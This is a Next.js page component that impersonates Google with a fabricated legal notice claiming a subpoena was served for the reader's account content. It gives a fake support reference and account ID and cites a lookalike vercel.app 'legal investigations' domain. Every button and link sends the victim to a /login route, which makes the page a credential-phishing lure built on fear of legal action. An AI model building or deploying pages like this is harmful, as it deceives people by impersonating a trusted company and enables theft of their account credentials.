import Link from "next/link";

export default function Home() {
  return (
    <div className="min-h-screen flex flex-col items-center bg-gray-100 font-sans text-black">
      <header className="w-full p-4">
        <img
          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
          alt="Google Logo"
          className="h-8"
        />
      </header>
      <main className="max-w-2xl mx-auto mt-8 p-6 bg-white rounded-lg shadow">
        <h1 className="text-2xl font-bold mb-4">
          A SUBPOENA WAS SERVED ON GOOGLE LLC REQUIRING US TO PRODUCE A COPY OF
          YOUR GOOGLE ACCOUNT CONTENT
        </h1>
        <p className="mb-2">
          <strong>Google Support Ref#:</strong> [17-00000918456] Transferred to
          Legal Investigations
        </p>
        <p className="mb-2">
          <Link href="/login">
            <strong>Google Support Case:</strong>{" "}
            https://google-legal-investigations.vercel.app
          </Link>
        </p>
        <p className="mb-2">
          <strong>GOOGLE ACCOUNT ID:</strong> 1778307780341
        </p>
        <p className="mb-4">
          This notice is to alert you that the subpoena was issued to Google LLC
          by a law enforcement that seeks retrieval of information contained in
          your Google Account.
        </p>
        <p className="mb-6">
          To examine the case materials or take measures to submit a protest,
          please do so in the provided Google Support Case.
        </p>
        <div className="flex space-x-4">
          <Link
            href="/login"
            className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700"
          >
            Upload additional documents
          </Link>
          <Link
            href="/login"
            className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700"
          >
            View case
          </Link>
        </div>
      </main>
      <footer className="mt-8 text-gray-600">
        <Link href="/login">
          <p className="w-full mb-5">Google Legal Support</p>
        </Link>
      </footer>
    </div>
  );
}
